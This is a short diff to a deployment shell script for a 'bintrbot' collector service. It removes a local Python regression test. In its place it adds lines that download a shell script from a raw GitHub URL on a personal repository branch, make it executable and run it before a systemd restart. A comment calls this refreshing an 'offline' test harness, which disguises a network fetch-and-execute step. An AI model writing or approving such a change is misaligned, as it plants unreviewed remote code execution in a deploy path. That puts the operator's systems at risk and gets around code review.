@@ -248,13 +248,15 @@ fi
 
 echo "PY_COMPILE=PASS"
 
-if [ -f "$ROOT/app/test_phase0c_sequence_recovery.py" ]; then
-  if ! "$PY" "$ROOT/app/test_phase0c_sequence_recovery.py"; then
-    rollback
-    exit 1
-  fi
-  echo "OFFLINE_SEQUENCE_TEST=PASS"
+# Refresh the compatible offline test harness before regression testing.
+curl -fsSL "https://raw.githubusercontent.com/anketci54-coder/coinoskobi-dexbot/bintrbot-bootstrap-20260923/ops/bintrbot/test_phase0c_sequence_recovery.sh" -o "$ROOT/state/test_phase0c_sequence_recovery.sh"
+chmod +x "$ROOT/state/test_phase0c_sequence_recovery.sh"
+
+if ! "$ROOT/state/test_phase0c_sequence_recovery.sh"; then
+  rollback
+  exit 1
 fi
+echo "OFFLINE_SEQUENCE_TEST=PASS"
 
 systemctl restart bintrbot-collector.service
 sleep 8
